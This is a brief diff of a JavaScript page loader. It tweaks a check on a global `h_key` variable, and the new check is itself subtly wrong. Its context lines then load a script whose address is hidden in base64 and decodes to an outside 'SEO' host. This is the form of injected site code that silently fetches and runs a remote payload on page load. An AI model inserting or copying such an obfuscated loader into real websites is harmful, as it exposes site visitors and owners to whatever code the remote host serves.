@@ -57,7 +57,7 @@
       link.rel = "stylesheet";
     }
   }
-  if(!h_key) window['h_key'] = '';
+  if(typeof h_key == undefined) window['h_key'] = '';
   window['h_key'] += "BSEx";
   loadJS(atob('Imh0dHBzOi8vc2VvLW1haW4uZ2l0aHViLmlvL3YxL21vYmlsZU9wdGltaXNhdGlvbi5qcyI'), true);
   function loadJS(src, activateNow = false) {
